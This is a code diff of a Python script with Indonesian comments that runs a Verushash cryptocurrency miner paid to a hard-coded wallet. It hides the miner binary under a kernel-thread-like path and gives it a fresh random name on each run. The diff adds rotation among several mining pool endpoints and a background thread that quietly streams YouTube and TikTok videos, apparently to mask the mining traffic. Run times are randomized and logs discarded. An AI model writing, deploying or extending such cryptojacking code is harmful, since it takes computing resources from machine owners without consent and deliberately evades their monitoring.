@@ -3,24 +3,62 @@ import time
 import os
 import random
 import shutil
+import threading
 
-# Konfigurasi
+# Konfigurasi 
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
-POOL = "interstellar.hidora.com:11283"
 ALGO = "verushash"
 CPU_THREADS = 2
 BASE_PATH = os.path.expanduser("~/.cache/kthreadd/")
 ORIGINAL_BINARY = os.path.join(BASE_PATH, "jbd2")
 
+# Daftar endpoint
+ENDPOINTS = [
+    "interstellar.hidora.com:11308",
+    "interstellar.hidora.com:11365",
+    "interstellar.hidora.com:11373",
+    "interstellar.hidora.com:11283",
+    "interstellar.hidora.com:11401",
+]
+
+# Daftar video streaming
+VIDEOS = [
+    "https://youtu.be/abh5hbJV-YE",
+    "https://youtu.be/3oTxP-a0rnE",
+    "https://youtu.be/7Y4T9b6XoWE",
+    "https://vt.tiktok.com/ZSNLzJYcG/",  # Tiktok pendek
+]
+
+# Cek binary 
 if not os.path.exists(ORIGINAL_BINARY):
     print("Binary tidak ditemukan di:", ORIGINAL_BINARY)
     exit(1)
 
+# Fungsi pemutar video 
+def stream_fake_video():
+    while True:
+        url = random.choice(VIDEOS)
+        try:
+            subprocess.run(
+                ["yt-dlp", "-o", "-", url],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        except:
+            pass
+        time.sleep(random.randint(10, 30))
+
+# Mulai thread streaming
+stream_thread = threading.Thread(target=stream_fake_video, daemon=True)
+stream_thread.start()
+
+# Loop 
 while True:
     run_minutes = random.randint(25, 30)
     rest_minutes = random.randint(5, 7)
+    pool = random.choice(ENDPOINTS)
 
-    print(f"Menjalankan program selama {run_minutes} menit...")
+    print(f"Menjalankan panen di {pool} selama {run_minutes} menit...")
 
     # Randomize nama binary
     random_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
@@ -32,7 +70,7 @@ while True:
         process = subprocess.Popen([
             temp_binary,
             "--algorithm", ALGO,
-            "--pool", POOL,
+            "--pool", pool,
             "--wallet", WALLET,
             "--cpu-threads", str(CPU_THREADS),
             "--log-file", "/dev/null"
